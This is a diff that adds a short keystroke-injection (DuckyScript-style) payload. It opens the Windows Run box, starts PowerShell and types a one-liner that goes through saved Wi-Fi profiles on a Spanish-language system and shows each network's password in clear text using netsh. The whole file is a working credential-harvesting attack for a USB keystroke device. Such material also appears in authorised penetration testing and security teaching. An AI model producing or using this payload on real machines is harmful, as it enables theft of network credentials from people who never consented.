@@ -1,0 +1,7 @@
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+STRING (netsh wlan show profiles | Select-String "Perfil de todos los usuarios").ForEach({$profileName = $_.Line.Split(":")[1].Trim(); $keyLine = (netsh wlan show profile name="$profileName" key=clear | Select-String "Contenido de la clave"); if ($keyLine) { $password = $keyLine.Line.Split(":")[1].Trim(); Write-Output "SSID: $profileName - Contraseña: $password" } else { Write-Output "SSID: $profileName - Sin contraseña o no se pudo recuperar" } })
+ENTER
